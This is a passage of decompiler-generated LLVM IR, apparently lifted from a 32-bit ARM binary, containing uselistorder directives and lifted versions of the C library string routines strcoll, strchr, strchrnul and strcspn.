  uselistorder i32 %v1_16b04, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16af4, { 0, 2, 1 }
  uselistorder i32 %v4_16af0, { 1, 0 }
  uselistorder i32 %v3_16ae4, { 1, 0 }
  uselistorder i32 %v1_16adc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16ad0, { 1, 0 }
  uselistorder i32 %v12_16acc, { 0, 2, 1 }
  uselistorder i32 %v8_16aac, { 1, 0, 2 }
  uselistorder i32 %v5_16aac, { 1, 0, 2 }
  uselistorder i32 %v2_16aac, { 1, 0, 2 }
  uselistorder i32 %v0_16aac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16acc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16a88, { 0, 2, 1 }
  uselistorder i32 %v4_16a84, { 1, 0 }
  uselistorder i32 %v3_16a78, { 1, 0 }
  uselistorder i32 %v1_16a70, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16a64, { 1, 0 }
  uselistorder i32 %v12_16a60, { 0, 2, 1 }
  uselistorder i32 %v8_16a40, { 1, 0, 2 }
  uselistorder i32 %v5_16a40, { 1, 0, 2 }
  uselistorder i32 %v2_16a40, { 1, 0, 2 }
  uselistorder i32 %v0_16a40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a60, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16a1c, { 0, 2, 1 }
  uselistorder i32 %v4_16a18, { 1, 0 }
  uselistorder i32 %v3_16a0c, { 1, 0 }
  uselistorder i32 %v1_16a04, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_169f8, { 1, 0 }
  uselistorder i32 %v12_169f4, { 0, 2, 1 }
  uselistorder i32 %v8_169d4, { 1, 0, 2 }
  uselistorder i32 %v5_169d4, { 1, 0, 2 }
  uselistorder i32 %v2_169d4, { 1, 0, 2 }
  uselistorder i32 %v0_169d4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_169f4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_16a30, { 0, 2, 1 }
  uselistorder i32 %v1_16a2c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_169b0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_169b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16a34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16acc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_169a4, { 1, 0 }
  uselistorder i32 %v0_169a4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1699c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1699c, { 1, 0, 2 }
  uselistorder i32 %v0_1699c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16acc77, { 1, 0 }
  uselistorder i32 %v1_1697c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16984, { 1, 0 }
  uselistorder i32 %v0_16958, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1694c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_16938, { 1, 0, 2 }
  uselistorder i32 %v1_16934, { 1, 0 }
  uselistorder i32 %v1_1692c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1692c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16924, { 0, 2, 1 }
  uselistorder i32 %v3_16924, { 3, 0, 1, 2 }
  uselistorder i1 %v0_16924, { 1, 0 }
  uselistorder i1 %v1_16924, { 1, 0 }
  uselistorder i32 %v3_16920, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16918, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16904, { 1, 2, 0 }
  uselistorder i32 %v1_168fc, { 0, 2, 1 }
  uselistorder i32 %v12_168f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_168ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_168f0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_168e0, { 0, 2, 1 }
  uselistorder i32 %v1_168d8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_168d8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_168d0, { 1, 0 }
  uselistorder i32 %v1_168c8, { 2, 1, 0 }
  uselistorder i32 %v2_168c0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_168c0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_168bc, { 1, 0 }
  uselistorder i32 %v2_168b0, { 1, 0 }
  uselistorder i32 %v1_168b0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_168b0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_16d20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16c48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16be8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_16b74, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_16b38, { 1, 0 }
  uselistorder label %dec_label_pc_16b24, { 1, 0 }
  uselistorder label %dec_label_pc_16ae4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169ac, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1697c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_16918, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_168d8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_16d44.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_16d44 = phi i32 [ %v0_16d44.pre, %bb ], [ %v5_16d44, %bb3 ]
  %v0_16d40 = phi i32 [ %tmp, %bb ], [ %v5_16d40, %bb3 ]
  %v1_16d40 = inttoptr i32 %v0_16d40 to i8*
  %v2_16d40 = load i8, i8* %v1_16d40, align 1
  %v1_16d44 = inttoptr i32 %v0_16d44 to i8*
  %v2_16d44 = load i8, i8* %v1_16d44, align 1
  %v3_16d44 = zext i8 %v2_16d44 to i32
  %v2_16d48 = icmp eq i8 %v2_16d40, 0
  br i1 %v2_16d48, label %.dec_label_pc_16d54_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_16d44 = add i32 %v0_16d44, 1
  %v5_16d40 = add i32 %v0_16d40, 1
  %v3_16d40 = zext i8 %v2_16d40 to i32
  %v10_16d4c = icmp eq i8 %v2_16d40, %v2_16d44
  br i1 %v10_16d4c, label %entry, label %dec_label_pc_16d54

.dec_label_pc_16d54_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16d54

dec_label_pc_16d54:                               ; preds = %bb3, %.dec_label_pc_16d54_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_16d54_crit_edge ], [ %v3_16d40, %bb3 ]
  %v2_16d54.pre-phi = sub nsw i32 %.pn, %v3_16d44
  ret i32 %v2_16d54.pre-phi

; uselistorder directives
  uselistorder i8 %v2_16d40, { 0, 2, 1 }
  uselistorder i32 %v0_16d40, { 1, 0 }
  uselistorder i32 %v0_16d44, { 1, 0 }
  uselistorder label %dec_label_pc_16d54, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_16dc4 = urem i32 %arg1, 256
  %v0_16de43 = load i32, i32* @r0, align 4
  %v1_16de44 = urem i32 %v0_16de43, 4
  %v2_16de45 = icmp eq i32 %v1_16de44, 0
  br i1 %v2_16de45, label %dec_label_pc_16dec, label %dec_label_pc_16dcc

dec_label_pc_16dcc:                               ; preds = %entry, %dec_label_pc_16de0
  %v0_16de0 = phi i32 [ %v1_16de0, %dec_label_pc_16de0 ], [ %v0_16de43, %entry ]
  %v1_16dcc = inttoptr i32 %v0_16de0 to i8*
  %v2_16dcc = load i8, i8* %v1_16dcc, align 1
  %v3_16dcc = zext i8 %v2_16dcc to i32
  %v9_16dd0 = icmp eq i32 %v3_16dcc, %v1_16dc4
  br i1 %v9_16dd0, label %dec_label_pc_16ea0, label %dec_label_pc_16dd8

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16dcc
  %v2_16dd8 = icmp eq i8 %v2_16dcc, 0
  br i1 %v2_16dd8, label %dec_label_pc_16e9c, label %dec_label_pc_16de0

dec_label_pc_16de0:                               ; preds = %dec_label_pc_16dd8
  %v1_16de0 = add i32 %v0_16de0, 1
  %v1_16de4 = urem i32 %v1_16de0, 4
  %v2_16de4 = icmp eq i32 %v1_16de4, 0
  br i1 %v2_16de4, label %dec_label_pc_16dec, label %dec_label_pc_16dcc

dec_label_pc_16dec:                               ; preds = %dec_label_pc_16de0, %entry
  %v0_16df0 = phi i32 [ %v0_16de43, %entry ], [ %v1_16de0, %dec_label_pc_16de0 ]
  %v4_16dec = mul nuw nsw i32 %v1_16dc4, 256
  %v5_16dec = or i32 %v4_16dec, %v1_16dc4
  %v4_16df4 = mul i32 %v5_16dec, 65536
  %v5_16df4 = or i32 %v4_16df4, %v5_16dec
  br label %dec_label_pc_16df8

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16e94, %dec_label_pc_16e34, %dec_label_pc_16dec
  %v0_16e5c = phi i32 [ %v0_16df0, %dec_label_pc_16dec ], [ %v4_16df8, %dec_label_pc_16e34 ], [ %v4_16df8, %dec_label_pc_16e94 ]
  %v1_16df8 = inttoptr i32 %v0_16e5c to i32*
  %v2_16df8 = load i32, i32* %v1_16df8, align 4
  %v4_16df8 = add i32 %v0_16e5c, 4
  %v2_16e00 = xor i32 %v2_16df8, %v5_16df4
  %v2_16e0c = add i32 %v2_16df8, 2130640639
  %v1_16e10 = sub i32 -1, %v2_16df8
  %v2_16e14 = xor i32 %v2_16e0c, %v1_16e10
  %v2_16e20 = and i32 %v2_16e14, -2130640640
  store i32 %v2_16e20, i32* @r1, align 4
  %v2_16e28 = icmp eq i32 %v2_16e20, 0
  br i1 %v2_16e28, label %dec_label_pc_16e34, label %dec_label_pc_16e3c

dec_label_pc_16e34:                               ; preds = %dec_label_pc_16df8
  %v2_16e04 = add i32 %v2_16e00, 2130640639
  %v1_16e1c = sub i32 -1, %v2_16e00
  %v2_16e24 = xor i32 %v2_16e04, %v1_16e1c
  %v2_16e2c = and i32 %v2_16e24, -2130640640
  %v2_16e34 = icmp eq i32 %v2_16e2c, 0
  br i1 %v2_16e34, label %dec_label_pc_16df8, label %dec_label_pc_16e3c

dec_label_pc_16e3c:                               ; preds = %dec_label_pc_16df8, %dec_label_pc_16e34
  %v2_16e3c = inttoptr i32 %v0_16e5c to i8*
  %v3_16e3c = load i8, i8* %v2_16e3c, align 1
  %v4_16e3c = zext i8 %v3_16e3c to i32
  %v9_16e40 = icmp eq i32 %v4_16e3c, %v1_16dc4
  br i1 %v9_16e40, label %dec_label_pc_16ea0, label %dec_label_pc_16e4c

dec_label_pc_16e4c:                               ; preds = %dec_label_pc_16e3c
  %v2_16e4c = icmp eq i8 %v3_16e3c, 0
  br i1 %v2_16e4c, label %dec_label_pc_16e9c, label %dec_label_pc_16e54

dec_label_pc_16e54:                               ; preds = %dec_label_pc_16e4c
  %v1_16e54 = add i32 %v0_16e5c, 1
  %v2_16e54 = inttoptr i32 %v1_16e54 to i8*
  %v3_16e54 = load i8, i8* %v2_16e54, align 1
  %v4_16e54 = zext i8 %v3_16e54 to i32
  %v9_16e58 = icmp eq i32 %v4_16e54, %v1_16dc4
  br i1 %v9_16e58, label %dec_label_pc_16ea0, label %dec_label_pc_16e64

dec_label_pc_16e64:                               ; preds = %dec_label_pc_16e54
  %v2_16e64 = icmp eq i8 %v3_16e54, 0
  br i1 %v2_16e64, label %dec_label_pc_16e9c, label %dec_label_pc_16e6c

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16e64
  %v1_16e6c = add i32 %v0_16e5c, 2
  %v2_16e6c = inttoptr i32 %v1_16e6c to i8*
  %v3_16e6c = load i8, i8* %v2_16e6c, align 1
  %v4_16e6c = zext i8 %v3_16e6c to i32
  %v9_16e70 = icmp eq i32 %v4_16e6c, %v1_16dc4
  br i1 %v9_16e70, label %dec_label_pc_16ea0, label %dec_label_pc_16e7c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e6c
  %v2_16e7c = icmp eq i8 %v3_16e6c, 0
  br i1 %v2_16e7c, label %dec_label_pc_16e9c, label %dec_label_pc_16e84

dec_label_pc_16e84:                               ; preds = %dec_label_pc_16e7c
  %v1_16e84 = add i32 %v0_16e5c, 3
  %v2_16e84 = inttoptr i32 %v1_16e84 to i8*
  %v3_16e84 = load i8, i8* %v2_16e84, align 1
  %v4_16e84 = zext i8 %v3_16e84 to i32
  %v9_16e88 = icmp eq i32 %v4_16e84, %v1_16dc4
  br i1 %v9_16e88, label %dec_label_pc_16ea0, label %dec_label_pc_16e94

dec_label_pc_16e94:                               ; preds = %dec_label_pc_16e84
  %v2_16e94 = icmp eq i8 %v3_16e84, 0
  br i1 %v2_16e94, label %dec_label_pc_16e9c, label %dec_label_pc_16df8

dec_label_pc_16e9c:                               ; preds = %dec_label_pc_16dd8, %dec_label_pc_16e94, %dec_label_pc_16e7c, %dec_label_pc_16e64, %dec_label_pc_16e4c
  br label %dec_label_pc_16ea0

dec_label_pc_16ea0:                               ; preds = %dec_label_pc_16dcc, %dec_label_pc_16e84, %dec_label_pc_16e6c, %dec_label_pc_16e54, %dec_label_pc_16e3c, %dec_label_pc_16e9c
  %v1_16ea4 = phi i32 [ 0, %dec_label_pc_16e9c ], [ %v1_16e84, %dec_label_pc_16e84 ], [ %v1_16e6c, %dec_label_pc_16e6c ], [ %v1_16e54, %dec_label_pc_16e54 ], [ %v0_16e5c, %dec_label_pc_16e3c ], [ %v0_16de0, %dec_label_pc_16dcc ]
  ret i32 %v1_16ea4

; uselistorder directives
  uselistorder i32 %v4_16df8, { 1, 0 }
  uselistorder i32 %v2_16df8, { 0, 2, 1 }
  uselistorder i32 %v0_16e5c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_16dec, { 1, 0 }
  uselistorder i32 %v1_16de0, { 1, 0, 2 }
  uselistorder i32 %v0_16de43, { 2, 1, 0 }
  uselistorder i32 %v1_16dc4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_16ea0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16e9c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16e3c, { 1, 0 }
  uselistorder label %dec_label_pc_16dcc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_16eb4 = urem i32 %arg1, 256
  %v0_16ed42 = load i32, i32* @r0, align 4
  %v1_16ed43 = urem i32 %v0_16ed42, 4
  %v2_16ed44 = icmp eq i32 %v1_16ed43, 0
  br i1 %v2_16ed44, label %dec_label_pc_16edc, label %dec_label_pc_16ebc

dec_label_pc_16ebc:                               ; preds = %entry, %dec_label_pc_16ed0
  %v0_16ed0 = phi i32 [ %v1_16ed0, %dec_label_pc_16ed0 ], [ %v0_16ed42, %entry ]
  %v1_16ebc = inttoptr i32 %v0_16ed0 to i8*
  %v2_16ebc = load i8, i8* %v1_16ebc, align 1
  %v3_16ebc = zext i8 %v2_16ebc to i32
  %v9_16ec0 = icmp eq i32 %v3_16ebc, %v1_16eb4
  br i1 %v9_16ec0, label %dec_label_pc_16f8c, label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16ebc
  %v2_16ec8 = icmp eq i8 %v2_16ebc, 0
  br i1 %v2_16ec8, label %dec_label_pc_16f8c, label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16ec8
  %v1_16ed0 = add i32 %v0_16ed0, 1
  %v1_16ed4 = urem i32 %v1_16ed0, 4
  %v2_16ed4 = icmp eq i32 %v1_16ed4, 0
  br i1 %v2_16ed4, label %dec_label_pc_16edc, label %dec_label_pc_16ebc

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16ed0, %entry
  %v0_16ee0 = phi i32 [ %v0_16ed42, %entry ], [ %v1_16ed0, %dec_label_pc_16ed0 ]
  %v4_16edc = mul nuw nsw i32 %v1_16eb4, 256
  %v5_16edc = or i32 %v4_16edc, %v1_16eb4
  %v4_16ee4 = mul i32 %v5_16edc, 65536
  %v5_16ee4 = or i32 %v4_16ee4, %v5_16edc
  br label %dec_label_pc_16ee8

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16f84, %dec_label_pc_16f24, %dec_label_pc_16edc
  %v0_16f4c = phi i32 [ %v0_16ee0, %dec_label_pc_16edc ], [ %v4_16ee8, %dec_label_pc_16f24 ], [ %v4_16ee8, %dec_label_pc_16f84 ]
  %v1_16ee8 = inttoptr i32 %v0_16f4c to i32*
  %v2_16ee8 = load i32, i32* %v1_16ee8, align 4
  %v4_16ee8 = add i32 %v0_16f4c, 4
  %v2_16ef0 = xor i32 %v2_16ee8, %v5_16ee4
  %v2_16efc = add i32 %v2_16ee8, 2130640639
  %v1_16f00 = sub i32 -1, %v2_16ee8
  %v2_16f04 = xor i32 %v2_16efc, %v1_16f00
  %v2_16f10 = and i32 %v2_16f04, -2130640640
  store i32 %v2_16f10, i32* @r1, align 4
  %v2_16f18 = icmp eq i32 %v2_16f10, 0
  br i1 %v2_16f18, label %dec_label_pc_16f24, label %dec_label_pc_16f2c

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16ee8
  %v2_16ef4 = add i32 %v2_16ef0, 2130640639
  %v1_16f0c = sub i32 -1, %v2_16ef0
  %v2_16f14 = xor i32 %v2_16ef4, %v1_16f0c
  %v2_16f1c = and i32 %v2_16f14, -2130640640
  %v2_16f24 = icmp eq i32 %v2_16f1c, 0
  br i1 %v2_16f24, label %dec_label_pc_16ee8, label %dec_label_pc_16f2c

dec_label_pc_16f2c:                               ; preds = %dec_label_pc_16ee8, %dec_label_pc_16f24
  %v2_16f2c = inttoptr i32 %v0_16f4c to i8*
  %v3_16f2c = load i8, i8* %v2_16f2c, align 1
  %v4_16f2c = zext i8 %v3_16f2c to i32
  %v9_16f30 = icmp eq i32 %v4_16f2c, %v1_16eb4
  br i1 %v9_16f30, label %dec_label_pc_16f8c, label %dec_label_pc_16f3c

dec_label_pc_16f3c:                               ; preds = %dec_label_pc_16f2c
  %v2_16f3c = icmp eq i8 %v3_16f2c, 0
  br i1 %v2_16f3c, label %dec_label_pc_16f8c, label %dec_label_pc_16f44

dec_label_pc_16f44:                               ; preds = %dec_label_pc_16f3c
  %v1_16f44 = add i32 %v0_16f4c, 1
  %v2_16f44 = inttoptr i32 %v1_16f44 to i8*
  %v3_16f44 = load i8, i8* %v2_16f44, align 1
  %v4_16f44 = zext i8 %v3_16f44 to i32
  %v9_16f48 = icmp eq i32 %v4_16f44, %v1_16eb4
  br i1 %v9_16f48, label %dec_label_pc_16f8c, label %dec_label_pc_16f54

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f44
  %v2_16f54 = icmp eq i8 %v3_16f44, 0
  br i1 %v2_16f54, label %dec_label_pc_16f8c, label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_16f54
  %v1_16f5c = add i32 %v0_16f4c, 2
  %v2_16f5c = inttoptr i32 %v1_16f5c to i8*
  %v3_16f5c = load i8, i8* %v2_16f5c, align 1
  %v4_16f5c = zext i8 %v3_16f5c to i32
  %v9_16f60 = icmp eq i32 %v4_16f5c, %v1_16eb4
  br i1 %v9_16f60, label %dec_label_pc_16f8c, label %dec_label_pc_16f6c

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f5c
  %v2_16f6c = icmp eq i8 %v3_16f5c, 0
  br i1 %v2_16f6c, label %dec_label_pc_16f8c, label %dec_label_pc_16f74

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f6c
  %v1_16f74 = add i32 %v0_16f4c, 3
  %v2_16f74 = inttoptr i32 %v1_16f74 to i8*
  %v3_16f74 = load i8, i8* %v2_16f74, align 1
  %v4_16f74 = zext i8 %v3_16f74 to i32
  %v9_16f78 = icmp eq i32 %v4_16f74, %v1_16eb4
  br i1 %v9_16f78, label %dec_label_pc_16f8c, label %dec_label_pc_16f84

dec_label_pc_16f84:                               ; preds = %dec_label_pc_16f74
  %v2_16f84 = icmp eq i8 %v3_16f74, 0
  br i1 %v2_16f84, label %dec_label_pc_16f8c, label %dec_label_pc_16ee8

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16ec8, %dec_label_pc_16ebc, %dec_label_pc_16f84, %dec_label_pc_16f74, %dec_label_pc_16f6c, %dec_label_pc_16f5c, %dec_label_pc_16f54, %dec_label_pc_16f44, %dec_label_pc_16f3c, %dec_label_pc_16f2c
  %v1_16f90 = phi i32 [ %v1_16f74, %dec_label_pc_16f84 ], [ %v1_16f74, %dec_label_pc_16f74 ], [ %v1_16f5c, %dec_label_pc_16f6c ], [ %v1_16f5c, %dec_label_pc_16f5c ], [ %v1_16f44, %dec_label_pc_16f54 ], [ %v1_16f44, %dec_label_pc_16f44 ], [ %v0_16f4c, %dec_label_pc_16f3c ], [ %v0_16f4c, %dec_label_pc_16f2c ], [ %v0_16ed0, %dec_label_pc_16ebc ], [ %v0_16ed0, %dec_label_pc_16ec8 ]
  ret i32 %v1_16f90

; uselistorder directives
  uselistorder i32 %v4_16ee8, { 1, 0 }
  uselistorder i32 %v2_16ee8, { 0, 2, 1 }
  uselistorder i32 %v0_16f4c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_16edc, { 1, 0 }
  uselistorder i32 %v1_16ed0, { 1, 0, 2 }
  uselistorder i32 %v0_16ed42, { 2, 1, 0 }
  uselistorder i32 %v1_16eb4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_16f8c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_16f2c, { 1, 0 }
  uselistorder label %dec_label_pc_16ebc, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_16f9c = load i32, i32* @r4, align 4
  store i32 %v3_16f9c, i32* %stack_var_-16, align 4
  %v6_16f9c = load i32, i32* @r5, align 4
  %v9_16f9c = load i32, i32* @r6, align 4
  %v0_16fa0 = load i32, i32* @r0, align 4
  %v0_16fa4 = load i32, i32* @r1, align 4
  store i32 %v0_16fa4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_16fc08 = inttoptr i32 %v0_16fa0 to i8*
  %v2_16fc09 = load i8, i8* %v1_16fc08, align 1
  %v3_16fc010 = zext i8 %v2_16fc09 to i32
  store i32 %v3_16fc010, i32* @r1, align 4
  %v2_16fc411 = icmp eq i8 %v2_16fc09, 0
  store i32 %v0_16fa4, i32* @r0, align 4
  %v1_16fcc12 = add i32 %v0_16fa0, 1
  store i32 %v1_16fcc12, i32* @r4, align 4
  br i1 %v2_16fc411, label %dec_label_pc_16fd4, label %dec_label_pc_16fb0

dec_label_pc_16fb0:                               ; preds = %entry, %dec_label_pc_16fbc
  %v3_16fc014 = phi i32 [ %v3_16fc0, %dec_label_pc_16fbc ], [ %v3_16fc010, %entry ]
  %v0_16fc813 = phi i32 [ %v0_16fc8.pre, %dec_label_pc_16fbc ], [ %v0_16fa4, %entry ]
  %v2_16fb0 = call i32 @__GI_strchr(i32 %v0_16fc813, i32 %v3_16fc014)
  %v2_16fb4 = icmp eq i32 %v2_16fb0, 0
  %v0_16fbc = load i32, i32* @r5, align 4
  br i1 %v2_16fb4, label %dec_label_pc_16fbc, label %dec_label_pc_16fd4

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16fb0
  %v1_16fbc = add i32 %v0_16fbc, 1
  %v0_16fc0.pre = load i32, i32* @r4, align 4
  %v0_16fc8.pre = load i32, i32* @r6, align 4
  store i32 %v1_16fbc, i32* @r5, align 4
  %v1_16fc0 = inttoptr i32 %v0_16fc0.pre to i8*
  %v2_16fc0 = load i8, i8* %v1_16fc0, align 1
  %v3_16fc0 = zext i8 %v2_16fc0 to i32
  store i32 %v3_16fc0, i32* @r1, align 4
  %v2_16fc4 = icmp eq i8 %v2_16fc0, 0
  store i32 %v0_16fc8.pre, i32* @r0, align 4
  %v1_16fcc = add i32 %v0_16fc0.pre, 1
  store i32 %v1_16fcc, i32* @r4, align 4
  br i1 %v2_16fc4, label %dec_label_pc_16fd4, label %dec_label_pc_16fb0

dec_label_pc_16fd4:                               ; preds = %dec_label_pc_16fbc, %dec_label_pc_16fb0, %entry
  %v0_16fd4 = phi i32 [ 0, %entry ], [ %v0_16fbc, %dec_label_pc_16fb0 ], [ %v1_16fbc, %dec_label_pc_16fbc ]
  %v2_16fd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16fd8, i32* @r4, align 4
  store i32 %v6_16f9c, i32* @r5, align 4
  store i32 %v9_16f9c, i32* @r6, align 4
  ret i32 %v0_16fd4

; uselistorder directives
